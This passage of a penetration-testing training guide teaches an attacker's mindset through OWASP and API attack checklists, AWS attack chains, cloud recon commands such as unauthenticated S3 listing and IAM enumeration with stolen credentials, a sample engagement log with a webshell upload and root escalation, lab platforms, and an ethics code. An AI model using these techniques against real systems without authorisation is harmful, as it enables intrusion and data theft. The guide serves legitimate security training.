  | A01: Broken Access Control | "We need to implement proper authorization" | "Check every endpoint for IDOR and privilege escalation" |
  | A02: Cryptographic Failures | "We should encrypt sensitive data" | "Look for plaintext secrets, weak algorithms, exposed keys" |
  | A03: Injection | "We need to sanitize input" | "Every input is a potential injection point" |
  | A04: Insecure Design | "We need threat modeling" | "Look for logic flaws that can't be patched — they are by design" |
  | A05: Security Misconfiguration | "We need to harden our configs" | "Default credentials, verbose errors, unnecessary features enabled" |
  | A06: Vulnerable Components | "We need to update dependencies" | "Check every library version for known CVEs" |
  | A07: Authentication Failures | "We need strong auth" | "Brute force, credential stuffing, session hijacking, MFA bypass" |
  | A08: Software Integrity Failures | "We need to verify updates" | "Supply chain attacks, CI/CD pipeline compromise" |
  | A09: Logging Failures | "We need better monitoring" | "The less they log, the more I can do undetected" |
  | A10: SSRF | "We need to restrict outbound requests" | "Make the server fetch internal resources for me" |
  :::

  :::tabs-item{icon="i-lucide-crosshair" label="Where to Look First"}
  When you land on a web application, check these in order:

  1. **Registration and login flows** — authentication bypass, account takeover, weak password policy
  2. **Password reset** — token predictability, email verification bypass, logic flaws
  3. **User profile / settings** — IDOR on user IDs, privilege escalation via role modification
  4. **File upload** — unrestricted file types, path traversal, code execution
  5. **Search / filter functionality** — SQL injection, XSS, LDAP injection
  6. **API endpoints** — missing authentication, excessive data exposure, mass assignment
  7. **Payment / checkout** — price manipulation, race conditions, logic flaws
  8. **Admin panels** — default credentials, exposed at predictable paths, authentication bypass
  9. **Error messages** — stack traces, database errors, internal paths disclosed
  10. **HTTP headers** — missing security headers, server version disclosure, cookie flags
  :::
::

### API Hacking Mindset

::callout{icon="i-lucide-plug"}
_"APIs are the new attack surface. They are everywhere, they carry sensitive data, and developers often protect the frontend but forget the backend."_
::

::accordion
  :::accordion-item{icon="i-lucide-search" label="API Discovery"}
  APIs hide. Your job is to find them.

  | Discovery Method | What You Find |
  | ---------------- | ------------- |
  | Browser DevTools (Network tab) | All API calls the frontend makes |
  | Mobile app proxy (Burp) | API endpoints the mobile app uses (often different from web) |
  | JavaScript files | Hardcoded API endpoints, keys, and secret routes |
  | `/swagger.json`, `/openapi.json` | Full API documentation (often left in production) |
  | `/graphql` with introspection | Complete schema — every query, mutation, and type |
  | `/.well-known/` | OpenID configuration, security.txt |
  | Wayback Machine | Old API versions that are still running |
  | GitHub repos | API documentation, Postman collections |
  :::

  :::accordion-item{icon="i-lucide-bug" label="API Attack Checklist"}
  | Test | What You Are Looking For |
  | ---- | ------------------------ |
  | Authentication | Missing auth on endpoints, broken token validation |
  | Authorization | BOLA (Broken Object-Level Authorization) — change the object ID |
  | Mass Assignment | Send extra fields: `{"role": "admin", "balance": 999999}` |
  | Rate Limiting | No rate limit on sensitive endpoints (login, OTP, password reset) |
  | Input Validation | SQL injection, NoSQL injection, command injection in API params |
  | Excessive Data Exposure | API returns more data than the frontend displays |
  | SSRF | API fetches URLs — what if the URL points to `http://169.254.169.254`? |
  | GraphQL specific | Nested query attacks (DoS), introspection enabled, batched brute force |
  | Versioning | `/api/v1/` is protected but `/api/v2/` has no auth |
  | Error handling | Verbose errors revealing internal details |
  :::
::

## Cloud Attack Mindset

::callout{icon="i-lucide-cloud"}
_"The cloud is just someone else's computer — with a massive API surface, complex IAM policies, and developers who think 'it is internal so it is safe'."_
::

::card-group
  ::card
  ---
  title: Metadata Service Abuse
  icon: i-lucide-server
  ---
  Every cloud VM has a metadata endpoint at `169.254.169.254`. If you achieve SSRF, you can steal IAM credentials, user data scripts, and cloud configuration. One SSRF = full cloud compromise.
  ::

  ::card
  ---
  title: IAM Misconfigurations
  icon: i-lucide-user-cog
  ---
  Overly permissive IAM roles are the #1 cloud vulnerability. A role with `s3:*` can read every bucket. A role with `iam:*` can escalate to God mode.
  ::

  ::card
  ---
  title: Storage Bucket Exposure
  icon: i-lucide-folder-open
  ---
  Public S3 buckets, GCS buckets, and Azure blobs have exposed terabytes of data. Check `s3://company-name-backup`, `s3://company-name-dev`, `s3://company-name-logs`.
  ::

  ::card
  ---
  title: Serverless & Container Escape
  icon: i-lucide-box
  ---
  Lambda functions with environment variable secrets, container images with embedded credentials, Kubernetes RBAC misconfigurations — cloud-native attacks require cloud-native thinking.
  ::
::

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="AWS Attack Paths"}
  ```text [Common AWS Attack Chains]
  SSRF → Metadata (169.254.169.254) → IAM Creds → S3 Access → Data Exfil
  
  Exposed .env → AWS Keys → IAM Enum → Privilege Escalation → Full Account
  
  Public Lambda URL → Code Injection → Env Vars → Database Creds → Data Breach
  
  Misconfigured S3 Bucket → Source Code → Hardcoded Secrets → Internal Access
  
  Exposed EKS API → Pod Exec → Service Account Token → Cloud IAM Role → Game Over
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Cloud Recon Commands"}
  ```bash [AWS]
  # Enumerate S3 buckets
  aws s3 ls s3://company-name-backup --no-sign-request
  
  # Check for public snapshots
  aws ec2 describe-snapshots --owner-ids self --query 'Snapshots[?!not_null(CreateVolumePermissions[?Group==`all`])]'
  
  # Enumerate IAM from stolen creds
  aws sts get-caller-identity
  aws iam list-users
  aws iam list-roles
  aws iam list-attached-user-policies --user-name target-user
  ```

  ```bash [Azure]
  # Enumerate blob storage
  az storage blob list --container-name public --account-name targetcompany
  
  # Check for exposed apps
  az ad app list --query "[?availableToOtherTenants==true]"
  ```

  ```bash [GCP]
  # Check for public buckets
  gsutil ls gs://company-name-backup
  
  # Enumerate projects
  gcloud projects list
  ```
  :::
::

## Building Your Lab

::note
You cannot develop an offensive mindset by reading alone. You need to **practice** — legally, in your own lab, against intentionally vulnerable targets.
::

### Recommended Practice Platforms

::card-group
  ::card
  ---
  title: Hack The Box
  icon: i-lucide-box
  to: https://www.hackthebox.com
  target: _blank
  ---
  Real-world vulnerable machines. Start with Easy, progress to Insane. The community writeups teach you how experienced hackers think.
  ::

  ::card
  ---
  title: TryHackMe
  icon: i-lucide-graduation-cap
  to: https://tryhackme.com
  target: _blank
  ---
  Guided learning paths with browser-based VMs. Perfect for beginners. The "Offensive Pentesting" path builds the mindset progressively.
  ::

  ::card
  ---
  title: PortSwigger Web Security Academy
  icon: i-lucide-globe
  to: https://portswigger.net/web-security
  target: _blank
  ---
  Free, expert-level web application security labs. If you master every lab here, you are a web app hacking expert. Period.
  ::

  ::card
  ---
  title: VulnHub
  icon: i-lucide-download
  to: https://www.vulnhub.com
  target: _blank
  ---
  Downloadable vulnerable VMs for your local lab. Boot them up in VirtualBox, hack them, learn from them.
  ::

  ::card
  ---
  title: OWASP WebGoat
  icon: i-lucide-bug
  to: https://owasp.org/www-project-webgoat/
  target: _blank
  ---
  Intentionally vulnerable web application for learning web security. Covers every OWASP Top 10 category with interactive lessons.
  ::

  ::card
  ---
  title: PentesterLab
  icon: i-lucide-flask-conical
  to: https://www.pentesterlab.com
  target: _blank
  ---
  Progressive exercises from basic to advanced. Their badge system ensures you build skills in the right order.
  ::
::

### Home Lab Setup

::code-group
  ```bash [Essential VMs]
  # Attack Machine
  - Kali Linux (latest) — your primary weapon
  - ParrotOS — alternative with better stealth tools
  - Commando VM — Windows-based attack platform

  # Vulnerable Targets
  - Metasploitable 2/3 — classic practice target
  - DVWA (Damn Vulnerable Web App) — web app practice
  - VulnHub machines — fresh challenges weekly
  - Windows Server (eval) — Active Directory lab

  # Infrastructure
  - pfSense — practice firewall bypass
  - Security Onion — see what defenders see
  - ELK Stack — understand logging/detection
  ```

  ```bash [Network Architecture]
  ┌──────────────────────────────────────────────┐
  │              Home Lab Network                 │
  │                                               │
  │  ┌─────────┐   ┌────────────┐   ┌─────────┐ │
  │  │  Kali   │   │  pfSense   │   │ Targets │ │
  │  │ Attack  │───│  Firewall  │───│  VLAN   │ │
  │  │ Machine │   │            │   │         │ │
  │  └─────────┘   └────────────┘   │ - DVWA  │ │
  │                                  │ - MSF2  │ │
  │  ┌─────────┐                    │ - Win7  │ │
  │  │ Security│                    │ - AD DC │ │
  │  │  Onion  │ (monitoring)       └─────────┘ │
  │  └─────────┘                                 │
  └──────────────────────────────────────────────┘
  ```
::

## Mental Models for Problem Solving

### When You Are Stuck

Every hacker gets stuck. The difference is how you get **unstuck**.

::accordion
  :::accordion-item{icon="i-lucide-refresh-cw" label="The Reset Protocol"}
  When you have been staring at the same target for hours with no progress:

  1. **Step away.** Literally walk away from the computer. Shower thoughts are real.
  2. **Enumerate again.** You missed something. You always miss something.
  3. **Change your angle.** If you have been attacking the web app, try the network. If you have been trying injection, try authentication. If you have been looking at Linux, check if there is a Windows component.
  4. **Read the output.** Actually read it. Not skim — read. That one line buried in 500 lines of Nmap output might be the key.
  5. **Google the version.** Seriously. `Apache 2.4.49 exploit` might return the exact CVE you need.
  6. **Check your assumptions.** Are you sure that is the right service? Are you sure the password is wrong and not the username? Are you sure the exploit failed and not that you misconfigured the payload?
  :::

  :::accordion-item{icon="i-lucide-list-tree" label="The Decision Tree"}
  ```text [What to Do When Stuck]
  Am I stuck?
  ├── Did I enumerate thoroughly?
  │   ├── No → Go back and enumerate harder
  │   └── Yes → Continue
  ├── Did I check all ports (all 65,535)?
  │   ├── No → Full port scan: nmap -p-
  │   └── Yes → Continue
  ├── Did I check UDP ports?
  │   ├── No → UDP scan: nmap -sU --top-ports 100
  │   └── Yes → Continue
  ├── Did I check for web directories?
  │   ├── No → dirb / gobuster / feroxbuster
  │   └── Yes → Continue
  ├── Did I check for subdomains?
  │   ├── No → Subdomain enumeration
  │   └── Yes → Continue
  ├── Did I read EVERY line of output?
  │   ├── No → Read it again. Slowly.
  │   └── Yes → Continue
  ├── Did I search for known vulnerabilities?
  │   ├── No → searchsploit, CVE databases, Google
  │   └── Yes → Continue
  ├── Did I try default credentials?
  │   ├── No → Try them. For every service.
  │   └── Yes → Continue
  ├── Am I attacking the right thing?
  │   ├── Maybe not → Re-assess the attack surface
  │   └── Yes → Continue
  └── Ask for help (forums, Discord, writeups for similar machines)
  ```
  :::

  :::accordion-item{icon="i-lucide-eye" label="The 'Beginner Eyes' Technique"}
  After hours of deep analysis, you develop tunnel vision. You are so focused on the complex exploit that you miss the obvious vulnerability.

  **Reset your perspective:**
  - Pretend you are seeing the target for the first time
  - Look at the login page — did you try `admin:admin`?
  - Look at the robots.txt — did you read it?
  - Look at the page source — is there a comment with credentials?
  - Look at the cookies — is there a `role=user` you can change to `role=admin`?

  The answer is often embarrassingly simple. The hardest machines on Hack The Box often have an initial foothold that is just a **default password** or an **exposed file**.
  :::
::

### The Attacker's Internal Monologue

This is how an experienced penetration tester's brain works during an engagement:

::code-collapse
```text [Internal Monologue: Real Engagement]
09:00 — Scope received. Three /24 subnets. Web apps on ports 80/443. 
        "Let's see what we are working with."

09:05 — Started full Nmap scan with service detection. Running in background.
        "While that runs, let me do some OSINT."

09:10 — Found 47 employee names on LinkedIn. Company uses first.last@company.com format.
        "That is my username list. Let me generate it."

09:15 — Found the company's GitHub org. 23 public repos.
        "Let me search for secrets. API keys, passwords, internal URLs."

09:22 — Found an AWS access key in a commit from 2022. It was rotated (doesn't work).
        But the commit also revealed an internal Jenkins URL.
        "They self-host Jenkins. Interesting. Let me check if it is in scope."

09:30 — Nmap results coming in. 47 hosts alive. Interesting ports:
        - 192.168.1.50: 22, 80, 443 (web server)
        - 192.168.1.55: 22, 3306 (MySQL exposed!)
        - 192.168.1.60: 80, 8080 (Jenkins!)
        - 192.168.1.70: 445, 3389 (Windows, SMB + RDP)
        "MySQL exposed to the network? That's a finding even if I can't crack it."

09:35 — Browsing the main web app on :80. It is a custom PHP application.
        "PHP applications are my favorite. Let me map every endpoint."

09:40 — Found /admin panel. Tried admin:admin. Nope. admin:password. Nope.
        Tried the company name: admin:Company2024! — BINGO.
        "They used a guessable password based on company name + year. Classic."

09:42 — Admin panel has file upload functionality. Uploading a PHP webshell...
        It accepts .php files. No validation.
        "This is too easy. But that is the point — real vulnerabilities ARE easy."

09:45 — Webshell confirmed. Running as www-data on Ubuntu 22.04.
        "Time to upgrade to a proper meterpreter session and start post-exploitation."

09:50 — Checking for privilege escalation. Found a cron job running as root 
        that executes a world-writable script.
        "Root in 5 minutes. Let me document everything before proceeding."

10:00 — Root obtained. Checking /etc/shadow, network connections, 
        what else this server can reach.
        "This server has a second NIC on 10.10.10.0/24. Internal network. 
        Time to pivot."

[... The engagement continues for days ...]
```
::

## Certifications & Learning Path

::note
Certifications do not make you a hacker. But they provide structure, prove foundational knowledge, and help you get hired. The real learning happens in labs, CTFs, and actual engagements.
::

::steps{level="3"}

### Foundation (0-6 Months)

::card-group
  ::card
  ---
  title: CompTIA Security+
  icon: i-lucide-shield
  ---
  Baseline security knowledge. Understand the fundamentals before trying to break them.
  ::

  ::card
  ---
  title: TryHackMe — Complete Beginner Path
  icon: i-lucide-graduation-cap
  ---
  Hands-on introduction to Linux, networking, web apps, and basic exploitation in guided environments.
  ::

  ::card
  ---
  title: eJPT (eLearnSecurity Junior Pentester)
  icon: i-lucide-award
  ---
  Entry-level pentest certification with practical exam. Good confidence builder.
  ::
::

### Intermediate (6-18 Months)

::card-group
  ::card
  ---
  title: OSCP (Offensive Security Certified Professional)
  icon: i-lucide-swords
  ---
  The gold standard. 24-hour hands-on exam. You either hack the machines or you fail. No multiple choice. No shortcuts. Transforms your methodology.
  ::

  ::card
  ---
  title: Hack The Box — Pro Labs
  icon: i-lucide-box
  ---
  Multi-machine environments simulating real enterprise networks. Dante, Offshore, RastaLabs — each one teaches a different attack scenario.
  ::

  ::card
  ---
  title: PortSwigger Web Security Academy (All Labs)
  icon: i-lucide-globe
  ---
  Complete every lab. Expert-level web hacking skills. This is how you become dangerous against web apps.
  ::
::

### Advanced (18+ Months)

::card-group
  ::card
  ---
  title: OSEP (Offensive Security Experienced Pentester)
  icon: i-lucide-flame
  ---
  Advanced evasion techniques, Active Directory exploitation, custom payload development. Where OSCP teaches methodology, OSEP teaches mastery.
  ::

  ::card
  ---
  title: CRTO (Certified Red Team Operator)
  icon: i-lucide-target
  ---
  Red team operations with Cobalt Strike. Command & control, evasion, lateral movement, and operational security.
  ::

  ::card
  ---
  title: OSWE (Offensive Security Web Expert)
  icon: i-lucide-code
  ---
  White-box web application penetration testing. Source code review, custom exploit development, advanced web attacks.
  ::

  ::card
  ---
  title: OSED (Offensive Security Exploit Developer)
  icon: i-lucide-cpu
  ---
  Binary exploitation, reverse engineering, custom exploit development. The deepest technical certification in the OSCP family.
  ::
::

### Continuous Growth (Forever)

::card-group
  ::card
  ---
  title: Bug Bounties
  icon: i-lucide-bug
  ---
  Real targets, real money, real consequences. HackerOne, Bugcrowd, Intigriti. Nothing sharpens your skills like finding bugs in production systems.
  ::

  ::card
  ---
  title: CTF Competitions
  icon: i-lucide-flag
  ---
  Capture The Flag competitions push you into unfamiliar territory — crypto, reversing, forensics, pwn. They stretch your brain in ways labs cannot.
  ::

  ::card
  ---
  title: Research & CVE Hunting
  icon: i-lucide-microscope
  ---
  Find new vulnerabilities. Get assigned a CVE. Contribute to the security community. This is where hackers become researchers.
  ::

  ::card
  ---
  title: Teaching & Mentoring
  icon: i-lucide-book-heart
  ---
  The best way to solidify your knowledge is to teach it. Write blogs, create videos, mentor juniors. You will discover gaps in your own understanding.
  ::
::

::

## The Ethical Framework

### Why Ethics Matter — Beyond "It's the Law"

::callout{icon="i-lucide-scale"}
_"With great power comes great responsibility. You have the skills to access systems most people cannot. How you use those skills defines who you are."_
::

::tabs
  :::tabs-item{icon="i-lucide-check-circle" label="The Ethical Hacker's Code"}
  1. **I only test systems I am authorized to test.** Written authorization, clear scope, documented rules of engagement.

  2. **I protect the data I discover.** If I find sensitive data, I document the vulnerability — I do not read, copy, or distribute the data.

  3. **I report everything I find.** Good and bad. If the test reveals no critical vulnerabilities, I say so honestly. I do not exaggerate findings.

  4. **I clean up after myself.** Every backdoor removed, every test account deleted, every artifact cleaned. The system should be in the same state as before the test.

  5. **I help fix what I break.** Findings without remediation guidance are useless. Every vulnerability report includes how to fix it.

  6. **I never use my skills for personal gain.** Not financial fraud, not stalking, not revenge, not "just to see if I can." Access without authorization is a crime, regardless of intent.

  7. **I continuously improve my skills.** The threat landscape evolves daily. An ethical hacker who stopped learning in 2020 is already obsolete.
  :::

  :::tabs-item{icon="i-lucide-x-circle" label="Lines You Never Cross"}
  | Scenario | Why It Is Wrong | What to Do Instead |
  | -------- | --------------- | ------------------ |
  | "I'll just check if this exploit works on my friend's server" | Unauthorized access — even with good intentions | Ask for written permission first |
  | "I found PII — let me check if my name is in there" | You are now reading data you have no right to read | Document the finding, stop reading |
  | "The scope says the web app only, but I found a way into the network" | Out of scope = unauthorized | Report the finding, request scope expansion |
  | "This company has terrible security — I'll hack them to teach them a lesson" | Vigilante hacking is still illegal hacking | Report through responsible disclosure programs |
  | "My ex's Instagram password might be weak..." | This is stalking and computer fraud | Walk away. Seriously. |
  | "I could sell these credentials on the dark web" | This is criminal activity that destroys lives | You are not a criminal. Act like it. |
  :::
::

### Responsible Disclosure

When you find a vulnerability in the wild — outside of a pentest or bug bounty:

::steps{level="4"}

#### Document the Vulnerability

Record exactly what you found, how you found it, and the potential impact. Do not exploit further than necessary to confirm the vulnerability exists.

#### Contact the Organization

- Check for a `security.txt` at `/.well-known/security.txt`
- Check for a bug bounty program on HackerOne, Bugcrowd, or their website
- Email `security@company.com`
- If no security contact exists, try their general contact or CTO/CISO on LinkedIn

#### Give Them Time

Industry standard is **90 days** to fix the vulnerability before public disclosure. Be patient. Some organizations move slowly.

#### Disclose Responsibly

If they fix it — great. Publish your write-up, get credit, build your reputation.
If they ignore you — escalate to a CERT/CC or publish after the 90-day window.

::

## Final Words

::callout{icon="i-lucide-brain"}
_"The best hackers are not the ones with the most tools or the most exploits. They are the ones who see what others miss — the exposed port that should have been closed, the assumption that should have been questioned, the trust boundary that should have been enforced. They think differently. They see systems not as intended, but as they truly are — imperfect, interconnected, and exploitable. And they use that vision to make the world more secure."_
::

::card-group
  ::card
  ---
  title: Stay Curious
  icon: i-lucide-sparkles
  ---
  The hacker mindset is fundamentally about curiosity. "How does this work? What happens if I change this? What did the developer assume?" Never lose that curiosity.
  ::

  ::card
  ---
  title: Stay Humble
  icon: i-lucide-heart-handshake
  ---
  No matter how good you are, someone is better. Every machine you cannot crack is a lesson. Every failed exploit is a learning opportunity. Ego is the enemy of growth.
  ::

  ::card
  ---
  title: Stay Legal
  icon: i-lucide-gavel
  ---
  The difference between a penetration tester and a criminal is a signed contract. The skills are identical. The authorization is what matters. Never forget this.
  ::

  ::card
  ---
  title: Stay Dangerous
  icon: i-lucide-zap
  ---
  Dangerous in the best way — dangerous to adversaries, dangerous to vulnerabilities, dangerous to the false sense of security. Be the threat that makes organizations stronger.
  ::
::

::tip
The offensive mindset is not something you learn once. It is something you **practice daily**. Every time you use an application, you should be thinking: _"How would I break this?"_ Every time you see a login page: _"What happens if I try SQL injection?"_ Every time you connect to WiFi: _"Is this the real access point?"_

That constant questioning, that refusal to accept things at face value — **that** is the hacker mindset. And once you develop it, you never see the world the same way again. :icon{name="i-lucide-brain"}
::